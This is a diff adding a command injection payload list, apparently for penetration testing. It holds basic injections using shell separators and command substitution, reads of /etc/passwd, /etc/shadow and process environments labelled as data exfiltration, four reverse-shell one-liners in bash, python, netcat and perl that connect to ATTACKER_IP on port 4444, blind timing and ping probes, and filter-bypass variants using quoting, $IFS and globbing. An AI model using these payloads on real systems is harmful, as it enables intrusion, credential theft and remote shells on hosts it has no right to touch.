@@ -1,0 +1,44 @@
+# Command Injection Payloads - Curated from exploit-cookbook
+# Source: proven-exploits.md + security-arsenal-argus.md
+
+# Basic injection
+; whoami
+| whoami
+|| whoami
+& whoami
+&& whoami
+$(whoami)
+`whoami`
+; id
+| id
+
+# Data exfiltration
+; cat /etc/passwd
+| cat /etc/passwd
+; cat /etc/shadow
+; cat /proc/self/environ
+; env
+; set
+; export
+
+# Reverse shell
+; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+| python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+; nc -e /bin/sh ATTACKER_IP 4444
+; perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")};'
+
+# Blind injection detection
+; sleep 5
+| sleep 5
+; ping -c 5 ATTACKER_IP
+$(sleep 5)
+`sleep 5`
+
+# Bypass filters
+; c'a't /etc/passwd
+; c"a"t /etc/passwd
+; cat${IFS}/etc/passwd
+; cat$IFS/etc/passwd
+; {cat,/etc/passwd}
+; cat</etc/passwd
+; cat /etc/pass[w]d
